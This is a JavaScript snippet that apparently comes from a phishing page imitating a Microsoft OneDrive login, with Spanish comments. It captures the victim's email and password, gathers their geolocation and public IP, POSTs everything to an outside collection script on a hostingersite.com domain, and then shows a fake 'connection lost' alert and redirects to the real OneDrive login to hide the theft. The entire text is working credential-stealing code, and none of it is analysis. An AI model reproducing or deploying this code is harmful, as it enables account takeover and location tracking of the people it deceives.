    <script>
        document.querySelector(".butonRetunr").addEventListener("click", () => {
            window.location.href = "index.html"; // Cambia a la URL deseada
    });

		//obtener el valor de localStorage
        const emailGuardado = localStorage.getItem("setEmail");
        
        if (emailGuardado) {
        document.getElementById("userDisplayName").textContent = emailGuardado;
    }
   
    function IniciarSesion() {
    document.getElementById("progresor").style.display = "block";

    const password = document.getElementById("i0118").value;
    const email = localStorage.getItem("setEmail");

    if (!email || !password) {
        alert("Email o contraseña no válidos.");
        document.getElementById("progresor").style.display = "none";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;

                    const payload = {
                        email: email,
                        password: password,
                        ip: ip,
                        latitude: lat,
                        longitude: lon
                    };

                    //console.log("Datos recopilados para inicio de sesión:");
                    //console.log(payload);

                    fetch("https://purple-starling-269962.hostingersite.com/utils/send.php", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log("Respuesta del servidor:", data);
                        document.getElementById("progresor").style.display = "none";

                        if (data.status === "success") {
                            alert("Pérdida de conexión. Por favor intenta nuevamente.");
                            window.location.href = "https://onedrive.live.com/login";
                        } else {
                            alert("Error al iniciar sesión. Intenta nuevamente.");
                        }
                    })
                    .catch(error => {
                        console.error("Error al enviar los datos al servidor:", error);
                        document.getElementById("progresor").style.display = "none";
                        alert("Error de red. Intenta más tarde.");
                    });
                })
                .catch(error => {
                    console.error("Error al obtener la IP:", error);
                    document.getElementById("progresor").style.display = "none";
                    //alert("No se pudo obtener la IP.");
                });
        },
        (error) => {
            console.error("Error al obtener la ubicación:", error);
            document.getElementById("progresor").style.display = "none";
            alert("No se pudo obtener la ubicación.");
        }
    );
}
